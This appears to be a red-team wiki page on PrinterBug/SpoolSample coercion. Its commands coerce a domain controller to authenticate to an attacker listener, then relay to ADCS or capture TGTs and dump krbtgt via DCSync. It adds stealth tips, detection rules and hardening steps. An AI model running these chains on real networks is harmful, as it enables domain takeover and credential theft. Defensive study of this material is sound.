---
title: "Attack #42 — PrinterBug SpoolSample"
description: "The PrinterBug (aka SpoolSample) abuses the MS-RPRN (Print System Remote Protocol) RpcRemoteFindFirstPrinterChangeNotificationEx function to coerce a…"
category: active-directory
subcategory: "Domain Controller Attacks"
tags: ["active-directory", "kerberos", "adcs", "delegation", "ntlm"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Five/🔵 Attack #42 — PrinterBug SpoolSample.md"
---
# 🔵 Attack #42 — PrinterBug / SpoolSample — Print Spooler Coercion

***

## 📖 How It Works

The PrinterBug (aka SpoolSample) abuses the **[MS-RPRN (Print System Remote Protocol)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)** `RpcRemoteFindFirstPrinterChangeNotificationEx` function to coerce a target machine into authenticating back to an attacker-controlled host. When combined with **Unconstrained Delegation** or **NTLM relay**, this leads to TGT theft or certificate enrollment as the target machine account.

> [!info]+ Technical Deep-Dive — MS-RPRN Coercion Mechanism
> `ris:FileList`
> 1. The attacker connects to the target's **Print Spooler RPC endpoint** via the `\pipe\spoolss` named pipe (DCERPC interface UUID `12345678-1234-abcd-ef00-0123456789ab`)
> 2. The attacker calls `RpcRemoteFindFirstPrinterChangeNotificationEx` (OpNum 69) — this function is designed to allow a client to register for print job notifications from a remote print server
> 3. The function accepts a **notification target** parameter — the attacker specifies their own hostname/IP (e.g., `\\ATTACKER_IP`)
> 4. The Print Spooler service on the target attempts to send a notification to the specified host, triggering **NTLM authentication** (or Kerberos if the target resolves to a hostname)
> 5. If the attacker is running a listener (Responder, ntlmrelayx, Rubeus), they capture the coerced authentication
> 6. *Unlike PetitPotam, the PrinterBug has always required authentication (any domain user) — there was never an unauthenticated variant*
> 7. The coerced authentication includes the **machine account's TGT** when sent to a server with Unconstrained Delegation — this is the classic PrinterBug + UD attack

> [!tip]+ PrinterBug vs PetitPotam — When to Use Which
> `fas:Lightbulb`
> 1. **PrinterBug**: Requires Print Spooler running; always requires auth; older technique (2018); uses MS-RPRN
> 2. **PetitPotam (Attack #41)**: Uses MS-EFSR; was unauthenticated on unpatched DCs; newer (2021); more commonly available
> 3. **Use PrinterBug when**: PetitPotam is patched/blocked AND Print Spooler is running; or when targeting Unconstrained Delegation servers
> 4. **Use PetitPotam when**: Need unauthenticated coercion (unpatched); or Print Spooler is disabled on the target
> 5. *Both achieve the same result — forcing NTLM authentication to an attacker-controlled host; the difference is which RPC protocol triggers it*

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Print Spooler running on target** | Default enabled on servers and DCs (but should be disabled on DCs per best practice) |
| **Domain credentials** | Any valid domain user (always requires authentication) |
| **Relay target or UD server** | Must be combined with relay (ESC8, LDAP) or Unconstrained Delegation to be useful |
| **Network access** | Port 445 (SMB) to target for `\pipe\spoolss` access |

***

## 🛠️ Tools

| Tool | Platform | Version | Notes |
|---|---|---|---|
| [printerbug.py](https://github.com/dirkjanm/krbrelayx) | Linux/Python | Python 3 | dirkjanm's coercion script — part of krbrelayx toolkit |
| [SpoolSample.exe](https://github.com/leechristensen/SpoolSample) | Windows (.NET) | Latest | Lee Christensen's original C# PoC |
| [dementor.py](https://github.com/NotMedic/NetNTLMtoSilverTicket) | Linux/Python | Python 3 | Alternative Python implementation |
| [Coercer](https://github.com/p0dalirius/Coercer) | Linux/Python | ≥ 2.0 | Multi-protocol coercion — includes MS-RPRN |
| [rpcdump.py](https://github.com/fortra/impacket) | Linux | Impacket ≥ 0.10.0 | Check if Print Spooler RPC is accessible |
| [NetExec](https://github.com/Pennyw0rth/NetExec) | Linux | ≥ 1.1.0 | `-M spooler` module — check Spooler status |
| [ntlmrelayx.py](https://github.com/fortra/impacket) | Linux | Impacket ≥ 0.10.0 | NTLM relay for ESC8/LDAP chains |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Windows (.NET) | ≥ 2.0 | TGT monitor for Unconstrained Delegation attacks |

***

## ⏱️ Time-to-Execute Estimates

| Operation | Time | Notes |
|---|---|---|
| Spooler check (rpcdump/NXC) | **2–5 seconds** | Quick RPC query |
| PrinterBug coercion | **2–5 seconds** | Single RPC notification call |
| TGT capture (with UD) | **5–15 seconds** | Depends on callback timing |
| Full chain (coerce → relay → DCSync) | **30–90 seconds** | Similar to PetitPotam chains |

***

## 💻 Full Commands

### 🔵 Check If Print Spooler Is Running

```bash
# ── rpcdump.py — check for Spooler RPC endpoint ──────────────────────────────
rpcdump.py DC01.corp.local | grep -i spoolsv
# If present: "76F03F96-CDFD-44FC-A22C-64950A001209" = Spooler is running

# ── Alternative: rpcdump with specific interface UUID ─────────────────────────
rpcdump.py DC01.corp.local | grep "12345678-1234-ABCD-EF00-0123456789AB"
# MS-RPRN interface UUID — presence confirms Spooler is accessible

# ── NetExec spooler module ────────────────────────────────────────────────────
nxc smb DC01.corp.local -u low_user -p 'Password1' -M spooler
# Output: [+] Spooler service enabled or [-] Spooler service disabled

# ── Scan entire subnet for Spooler ────────────────────────────────────────────
nxc smb 10.10.10.0/24 -u low_user -p 'Password1' -M spooler
```

```powershell
# ── Windows — check Spooler pipe ──────────────────────────────────────────────
ls \\DC01.corp.local\pipe\spoolss
# If accessible: Spooler is running and pipe is reachable

# ── PowerShell — check Spooler service status ─────────────────────────────────
Get-Service -ComputerName DC01.corp.local -Name Spooler | Select-Object Status
```

### 🔴 PrinterBug Coercion

```bash
# ── printerbug.py (krbrelayx) ────────────────────────────────────────────────
printerbug.py corp.local/low_user:'Password1'@DC01.corp.local LISTENER_IP

# ── With Pass-the-Hash ────────────────────────────────────────────────────────
printerbug.py corp.local/low_user@DC01.corp.local -hashes :aabbccdd11223344 LISTENER_IP

# ── dementor.py (alternative) ─────────────────────────────────────────────────
python3 dementor.py -u low_user -p 'Password1' -d corp.local \
  LISTENER_IP DC01.corp.local

# ── Coercer (multi-protocol — MS-RPRN filter) ────────────────────────────────
coercer coerce -u low_user -p 'Password1' -d corp.local \
  -l LISTENER_IP -t DC01.corp.local --filter-protocol-name MS-RPRN
```

```powershell
# ── SpoolSample.exe (Windows) ─────────────────────────────────────────────────
.\SpoolSample.exe DC01.corp.local LISTENER.corp.local
# Coerces DC01 to authenticate to LISTENER.corp.local
```

### 🔴 Combined Attacks

#### PrinterBug + ADCS Relay (ESC8)

```bash
# ── Terminal 1: Start NTLM relay to ADCS web enrollment ─────────────────────
ntlmrelayx.py -t http://CA01.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# ── Terminal 2: Coerce DC via PrinterBug ──────────────────────────────────────
printerbug.py corp.local/low_user:'Password1'@DC01.corp.local ATTACKER_IP

# ── Terminal 3: Use the certificate ───────────────────────────────────────────
certipy auth -pfx DC01.pfx -dc-ip 10.10.10.10
export KRB5CCNAME=DC01.ccache
secretsdump.py -k -no-pass corp.local/'DC01$'@DC01.corp.local -just-dc
```

#### PrinterBug + Unconstrained Delegation (TGT Capture)

```powershell
# ── Step 1: On compromised UD server — monitor for incoming TGTs ──────────────
.\Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap
# Rubeus monitors for TGTs arriving in the LSASS cache
```

```bash
# ── Step 2: From attacker — coerce DC to authenticate to UD server ────────────
printerbug.py corp.local/low_user:'Password1'@DC01.corp.local UD_SERVER.corp.local
# DC01 sends a Kerberos TGT to UD_SERVER (because UD servers cache all incoming TGTs)
```

```powershell
# ── Step 3: On UD server — Rubeus captures DC01$'s TGT ───────────────────────
# Output: [*] Captured TGT for DC01$@CORP.LOCAL (base64 encoded)

# ── Step 4: Import TGT and DCSync ─────────────────────────────────────────────
.\Rubeus.exe ptt /ticket:<base64_TGT>
# Now running as DC01$ — perform DCSync:
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

```bash
# ── Alternative: Use captured TGT from Linux ──────────────────────────────────
# Convert the base64 ticket to ccache and use secretsdump:
python3 -c "import base64; open('dc01.kirbi','wb').write(base64.b64decode('<base64_TGT>'))"
ticketConverter.py dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass corp.local/'DC01$'@DC01.corp.local -just-dc
```

***

## 🎯 OPSEC Tips

1. **PrinterBug coercion is a single RPC call** — relatively quiet on the network; the Spooler notification callback is normal printer behavior
2. **The UD + TGT capture path is stealthier than relay** — no NTLM relay artifacts; just Kerberos ticket caching on the UD server
3. **Spooler checks via rpcdump are noisy** — they enumerate all RPC endpoints; use NetExec `-M spooler` for targeted checks
4. **Timing matters less than with PetitPotam** — PrinterBug traffic blends well with normal print operations during any time
5. **Clean up Rubeus processes** on the UD server after TGT capture — long-running monitors are suspicious
6. **Use hostname, not IP, for the listener** when targeting UD — Kerberos authentication (and TGT caching) requires hostname resolution

### 📊 OpSec Ranking

| Method | Stealth | Speed | Reliability | Notes |
|---|---|---|---|---|
| PrinterBug + UD (TGT capture) | 🟢 High | 🟢 Fast | 🟢 High | No relay artifacts; Kerberos only |
| PrinterBug + ESC8 relay | 🟡 Medium | 🟢 Fast | 🟢 High | NTLM relay generates some logs on CA |
| PrinterBug + LDAPS relay | 🟡 Medium | 🟡 Medium | 🟡 Medium | Creates machine account + RBCD entry |
| Coercer scan + coerce | 🔴 Low | 🟡 Medium | 🟢 High | Scanning is noisy; targeted coercion is fine |

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | DC authenticating to unexpected workstation (NTLM or Kerberos Type 3 logon) |
| **Sysmon 17/18** | Sysmon | Named pipe `\\pipe\\spoolss` connection from external IP |
| **5145** | Security Log | IPC$ share access for `\pipe\spoolss` from non-admin workstation |
| **4768** | Security Log (DC) | TGT request from UD server for DC01$ (if UD path used) |

### 🔎 Sigma Rules

```yaml
# ── SigmaHQ — Print Spooler Pipe Access from Non-Print Server ────────────────
title: Remote Print Spooler Pipe Access (PrinterBug/SpoolSample)
id: b3c4d5e6-printerbug-spoolss-access
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName: '\\*\IPC$'
    RelativeTargetName: 'spoolss'
  filter_print_servers:
    IpAddress|startswith:
      - '10.10.10.20'  # Replace with legit print server IPs
  condition: selection and not filter_print_servers
level: medium
tags:
  - attack.credential_access
  - attack.t1187
```

```yaml
# ── SigmaHQ — DC Authentication to Workstation (Coercion Indicator) ──────────
title: Domain Controller Authenticating to Workstation
id: a2b3c4d5-dc-auth-to-workstation
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    TargetUserName|endswith: '$'
    TargetUserName|contains: 'DC'
  filter_dc_to_dc:
    IpAddress|startswith:
      - '10.10.10.10'  # Replace with DC IPs
  condition: selection and not filter_dc_to_dc
level: high
```

### 🛡️ EDR-Specific Detections

> [!warning]+ Microsoft Defender for Identity (MDI)
> `ris:Windows`
> 1. **"Suspected NTLM authentication tampering"** — detects NTLM relay following Spooler-coerced authentication
> 2. MDI monitors for DC machine accounts authenticating to non-DC endpoints — a key PrinterBug indicator
> 3. *MDI does not specifically detect the PrinterBug RPC call itself — it detects the anomalous NTLM authentication that results from it*

> [!warning]+ CrowdStrike Falcon
> `ris:Radar`
> 1. **"Print Spooler Coercion Attack"** — behavioral detection for spoolss pipe manipulation followed by outbound NTLM
> 2. Process tree analysis flags SpoolSample.exe and known coercion tool signatures
> 3. Network-level detection for outbound NTLM from DC machine accounts

> [!warning]+ Elastic Security
> `ris:FileList`
> 1. Rule: **"Print Spooler Named Pipe Access"** — monitors for remote spoolss pipe connections from unusual sources
> 2. Rule: **"DC Machine Account Authentication to Non-DC"** — correlates 4624 events with DC machine accounts authenticating to workstations

***

## 🔬 Forensic Artifacts

| Artifact | Location | Details |
|---|---|---|
| **Pipe access** | Event 5145 / Sysmon 17/18 | `\pipe\spoolss` access from attacker IP |
| **NTLM auth** | Event 4624 on relay target | DC machine account Type 3 logon on attacker machine or relay target |
| **TGT cache** (UD path) | UD server LSASS memory | DC01$ TGT cached in the UD server's credential cache — volatile, lost on reboot |
| **Rubeus process** (UD path) | Event 4688 / Sysmon 1 | Rubeus.exe execution on UD server with `monitor` command line |
| **Certificate enrollment** (ESC8 path) | CA Event Log 4886/4887 | Certificate issued for DC machine account |
| **RBCD entry** (LDAPS path) | AD `msDS-AllowedToActOnBehalfOfOtherIdentity` | Delegation configuration artifact |
| **Network capture** | PCAP | MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx` call on `\pipe\spoolss` |

***

> [!important]+ Windows Server Version Differences
> `ris:Windows`
> 1. **Server 2012 R2**: Print Spooler enabled by default; no specific mitigations
> 2. **Server 2016**: Print Spooler enabled by default; Microsoft began recommending disabling Spooler on DCs
> 3. **Server 2019**: Same as 2016; Print Spooler enabled by default but CIS Benchmarks recommend disabling on DCs
> 4. **Server 2022**: Print Spooler still enabled by default; Microsoft's security baseline recommends disabling on DCs
> 5. **Server 2025**: Print Spooler **disabled by default on Server Core installations**; still enabled on Desktop Experience — disable manually on DCs
> 6. *The PrinterBug has never been "patched" — it uses legitimate Print Spooler functionality; the only mitigation is disabling the Spooler service on servers that don't need it*

***

## 🔒 Hardening & Prevention

```powershell
# ── 1. Disable Print Spooler on DCs and sensitive servers ─────────────────────
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled

# ── 2. GPO — Disable Print Spooler domain-wide on servers ────────────────────
# Computer Configuration → Policies → Windows Settings → Security Settings →
# System Services → Print Spooler → Startup Type: Disabled
# Apply to OU containing DCs and sensitive servers (NOT workstations that need printing)

# ── 3. Block outbound SMB/NTLM from DCs ──────────────────────────────────────
New-NetFirewallRule -DisplayName "Block DC Outbound SMB" `
  -Direction Outbound -Protocol TCP -RemotePort 445 `
  -RemoteAddress "10.10.10.0/24" -Action Block `
  -Profile Domain
# ⚠️ Whitelist other DC IPs for replication traffic

# ── 4. Remove Unconstrained Delegation from servers ───────────────────────────
# Review all servers with UD:
Get-ADComputer -Filter { TrustedForDelegation -eq $true } |
  Select-Object Name, DistinguishedName
# Migrate to Constrained Delegation or RBCD where possible

# ── 5. Monitor Print Spooler service status on DCs ───────────────────────────
# Create a scheduled task that alerts if Spooler is running on a DC:
# Get-Service -Name Spooler | Where-Object { $_.Status -eq 'Running' }

# ── 6. Enable EPA on ADCS web enrollment (blocks ESC8 chain) ─────────────────
# Same as PetitPotam hardening — protects against relay regardless of coercion method
appcmd.exe set config "Default Web Site/certsrv" `
  /section:windowsAuthentication /extendedProtection.tokenChecking:Require
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `rpcdump` shows no Spooler interface | Print Spooler service is disabled on target | Target is hardened; try PetitPotam (Attack #41) or other coercion methods via Coercer |
| `printerbug.py` returns `ERROR_INVALID_HANDLE` | Spooler is running but connection failed | Try specifying the DC FQDN instead of IP; ensure port 445 is accessible |
| Coercion works but no auth received | Target DC can't reach listener IP (firewall) | Verify bidirectional SMB connectivity (port 445); attacker IP must be routable from DC |
| UD server doesn't capture TGT | Listener hostname doesn't resolve in DNS | Use a hostname that resolves in AD DNS; Kerberos requires proper name resolution for TGT forwarding |
| Rubeus monitor shows no tickets | TGT was received but for wrong SPN/account | Verify the UD server has `TrustedForDelegation = True`; check `/targetuser:DC01$` (with dollar sign) |
| `SpoolSample.exe` crashes | .NET version mismatch or missing dependencies | Compile for the target's .NET CLR version; use `printerbug.py` from Linux instead |
| ntlmrelayx relay fails after coercion | SMB signing enforced on relay target or EPA enabled | Switch relay target to HTTP (ADCS) which doesn't enforce signing; or use LDAPS if channel binding is off |
| Coercion succeeds but TGT is for wrong account | Targeting wrong server or Spooler responding as different service | Verify target is the actual DC (not a print server); check `nslookup` for correct IP resolution |

***

## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Procedure | APT Groups |
|---|---|---|---|---|
| **Credential Access** | [T1187](https://attack.mitre.org/techniques/T1187/) | Forced Authentication | Coerce target machine NTLM/Kerberos authentication via MS-RPRN Print Spooler notification callback | Red team operations; demonstrated by Lee Christensen (SpoolSample, 2018) |
| **Credential Access** | [T1557](https://attack.mitre.org/techniques/T1557/) | [.001 — LLMNR/NBT-NS/MDNS](https://attack.mitre.org/techniques/T1557/001/) | Relay coerced NTLM authentication to ADCS, LDAP, or SMB targets | Chained with relay frameworks |
| **Privilege Escalation** | [T1558](https://attack.mitre.org/techniques/T1558/) | Steal or Forge Kerberos Tickets | Capture DC's TGT via Unconstrained Delegation after PrinterBug coercion | Advanced red team operations |

> [!tip]+ Historical Context
> `fas:Lightbulb`
> 1. The PrinterBug was disclosed by **Lee Christensen (@tifkin_)** at DerbyCon 2018 in the talk "The Unintended Risks of Trusting Active Directory"
> 2. It was originally demonstrated as a way to compromise servers with **Unconstrained Delegation** — the "Printer Bug + UD" attack chain
> 3. After PetitPotam's discovery in 2021, PrinterBug became the "backup" coercion method when MS-EFSR is patched
> 4. *Microsoft considers PrinterBug a "by design" feature of the Print Spooler — it will never be patched; the mitigation is disabling the Spooler*

***

## 🔗 Attack Chain Context

```
[PrinterBug] ──→ Coerce target authentication via Print Spooler
         │
         ├──→ 🔗 Chains with: Unconstrained Delegation (Attack #15) — TGT capture
         ├──→ 🔗 Chains with: ESC8 (Attack #33) — ADCS certificate relay
         ├──→ 🔗 Chains with: NTLM relay (Attack #7) — general relay framework
         ├──→ 🔗 Related: PetitPotam (Attack #41) — MS-EFSR coercion (similar concept)
         ├──→ 🖨️ Requires Print Spooler running (disable on DCs to mitigate)
         ├──→ 🔑 UD path: coerce DC → capture TGT on UD server → DCSync (Attack #37)
         └──→ 💀 Defeated by: disable Print Spooler on DCs, block outbound SMB, remove UD
```

***

> ✅ **Attack #42 — PrinterBug complete.**
